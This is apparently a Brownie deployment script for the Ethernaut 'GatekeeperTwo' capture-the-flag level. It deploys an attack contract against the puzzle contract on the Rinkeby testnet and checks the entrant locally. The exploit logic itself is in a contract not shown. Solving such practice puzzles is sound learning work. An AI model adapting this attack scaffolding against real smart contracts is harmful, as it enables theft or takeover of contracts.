from brownie import Contract, network
from brownie import GatekeeperTwo, GatekeeperTwoAttack
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS


def online():
    """
    Function to attack the contract which is in the rinkeby network.
    """
    account = get_account()
    print(f"Using the account {account}")

    # GateKeeperOne
    abi = [
        {
            "inputs": [
                {"internalType": "bytes8", "name": "_gateKey", "type": "bytes8"}
            ],
            "name": "enter",
            "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "nonpayable",
            "type": "function",
        },
        {
            "inputs": [],
            "name": "entrant",
            "outputs": [{"internalType": "address", "name": "", "type": "address"}],
            "stateMutability": "view",
            "type": "function",
        },
    ]
    gatekeepertwo = Contract.from_abi(
        "GatekeeperTwo", "0x99038ddE0519B156a812131d521F1f5D05c0A451", abi
    )
    print(f"Rinkeby. Contract GateKeeperTwo deployed {gatekeepertwo}")

    # GateKeeperAttack
    gatekeepertwoattack = GatekeeperTwoAttack.deploy(
        gatekeepertwo.address,
        {"from": account},
        publish_source=False,
    )
    print(f"Rinkeby. GatekeeperTwoAttack deployed to {gatekeepertwoattack.address}")


def local():
    """
    Testing the contracts locally 'ganache-local'
    brownie run scripts/attack.py --network ganache-local
    """
    account = get_account()
    print(f"Locally. Using the account {account}")

    gatekeepertwo = GatekeeperTwo[-1]
    # The entrant should be different to 0x000......00000
    print(f"Locally. Entrant: {gatekeepertwo.entrant()}")


def main():
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        local()
    else:
        online()
